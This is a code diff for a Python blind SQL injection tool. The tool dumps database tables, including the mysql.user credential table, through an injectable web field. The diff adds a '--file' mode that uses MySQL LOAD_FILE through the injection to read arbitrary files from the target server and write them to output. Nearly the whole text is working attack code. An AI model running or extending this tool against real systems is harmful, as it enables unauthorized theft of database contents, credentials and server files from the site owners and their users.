@@ -101,19 +101,12 @@ class Injector:
         return self.getString("SELECT %s FROM %s.%s WHERE %s LIMIT %d,1"
                               % (column, table.schema, table.name, where, index))
 
-
-
 class Database:
 
     table_filter = "table_schema != 'INFORMATION_SCHEMA' AND (table_schema != 'mysql' OR table_name = 'user') AND table_schema != 'PERFORMANCE_SCHEMA'"
 
     def __init__(self, injector):
         self.injector = injector
-        PRINTER.print("Performing injection test...")
-        if not self.injector.checkBit("1=1"):
-            PRINTER.print("Failed injection! Are you sure your settings are correct?")
-            exit(1)
-        PRINTER.print("Success!")
         self.tables = []
         self.tables_table = Table(self.injector, 'tables', 'INFORMATION_SCHEMA')
         self.columns_table = Table(self.injector, 'columns', 'INFORMATION_SCHEMA')
@@ -225,8 +218,6 @@ class Record:
             self.data[column] = data
 
 
-
-
 class TableWhereAction(argparse.Action):
     def __call__(self, parser, namespace, value, option_string):
         if namespace.dump_table is None:
@@ -261,6 +252,7 @@ class Parser:
         parser.add_argument('-v', '--verbose', action='count')
 
         table_group = parser.add_mutually_exclusive_group()
+        table_group.add_argument('-f', '--file', type=str, help='Read FILE from the server instead of dumping database contents')
         table_group.add_argument('-t', '--tables_only', action='store_true', help='Only dump table names')
 
         dump_table_help = 'Dump data only from TABLE.'
@@ -317,40 +309,63 @@ class Parser:
 
 if __name__ == '__main__':
     p = Parser()
-
-    tableExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.01), 1))
-    recordExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.09), 1))
-    stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.1), 1))
-    charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.8), 1))
     
     verbosity = 0 if p.args.verbose is None else p.args.verbose
     PRINTER = Printer(verbosity, p.args.outfile)
 
     delay = DEFAULT_DELAY if p.args.delay is None else p.args.delay
     injector = Injector(p.args.url, p.args.success, delay, p.args.attack_field, p.parseOtherFields())
-    db = Database(injector)
-    if p.args.dump_table is None:
-        db.findTables(not p.args.tables_only)
-    else:
-        s = p.args.dump_table.split(".")
-        if len(s) == 1:
-            print("Dumping table %s" % s[0])
-            table = Table(injector, s[0], db.default_schema, db.columns_table)
+
+    if p.args.file is None:
+        PRINTER.print("Performing injection test...")
+        if not injector.checkBit("1=1"):
+            PRINTER.print("Failed injection! Are you sure your settings are correct?")
+            exit(1)
+        PRINTER.print("Success!")
+        
+        tableExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.01), 1))
+        recordExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.09), 1))
+        stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.1), 1))
+        charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.8), 1))
+        
+        db = Database(injector)
+        if p.args.dump_table is None:
+            db.findTables(not p.args.tables_only)
         else:
-            print("Dumping table %s.%s" % (s[0], s[1]))
-            table = Table(injector, s[1], s[0], db.columns_table)
-        table.populate(p.parseWhere())
-        db.tables.append(table)
+            s = p.args.dump_table.split(".")
+            if len(s) == 1:
+                print("Dumping table %s" % s[0])
+                table = Table(injector, s[0], db.default_schema, db.columns_table)
+            else:
+                print("Dumping table %s.%s" % (s[0], s[1]))
+                table = Table(injector, s[1], s[0], db.columns_table)
+            table.populate(p.parseWhere())
+            db.tables.append(table)
 
-    PRINTER.printToFile("========== DATABASE DUMP ==========")
-    for table in db.tables:
-        PRINTER.printToFile("======= TABLE: %s.%s" % (table.schema, table.name))
-        for record in table.records:
-            for column, value in record.data.items():
-                PRINTER.printToFile("%s: %s" % (column, value), 1)
+        PRINTER.printToFile("========== DATABASE DUMP ==========")
+        for table in db.tables:
+            PRINTER.printToFile("======= TABLE: %s.%s" % (table.schema, table.name))
+            for record in table.records:
+                for column, value in record.data.items():
+                    PRINTER.printToFile("%s: %s" % (column, value), 1)
+                PRINTER.printToFile("")
             PRINTER.printToFile("")
-        PRINTER.printToFile("")
 
-tableExecutor.shutdown()
-stringExecutor.shutdown()
-charExecutor.shutdown()
+        tableExecutor.shutdown()
+        recordExecutor.shutdown()
+        stringExecutor.shutdown()
+        charExecutor.shutdown()
+    else:
+        PRINTER.print("Performing file read test...")
+        if injector.checkBit("LOAD_FILE('%s') IS NULL" % p.args.file):
+            PRINTER.print("Unable to read file: %s" % p.args.file)
+            exit(1)
+        PRINTER.print("Success!")
+        
+        stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(1/9*p.args.max_threads), 1))
+        charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(8/9*p.args.max_threads), 1))
+
+        PRINTER.printToFile(injector.getString("LOAD_FILE('%s')" % p.args.file))
+
+        stringExecutor.shutdown()
+        charExecutor.shutdown()
